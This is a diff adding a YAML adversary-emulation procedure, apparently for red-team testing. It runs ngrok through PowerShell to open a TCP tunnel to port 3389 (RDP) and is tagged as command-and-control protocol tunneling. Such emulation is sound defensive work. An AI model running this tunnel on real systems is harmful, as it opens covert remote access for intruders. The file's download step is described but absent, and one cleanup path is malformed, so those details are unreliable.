@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: run ngrok
+description: |
+    Download and run ngrok. Create tunnel to chosen port.
+args:
+    - name: api_token
+      type: string
+      default: N/A
+    - name: port_num
+      type: integer
+      default: "3389"
+    - name: download
+      type: string
+      default: https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip
+uuid: 4cdc9fc7-53fb-4894-9f0c-64836943ea60
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1572: Protocol Tunneling'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: run-ngrok
+      inline: "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken {{.Args.api_token}} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp {{.Args.port_num}} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
+            Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
+        executor: powershell
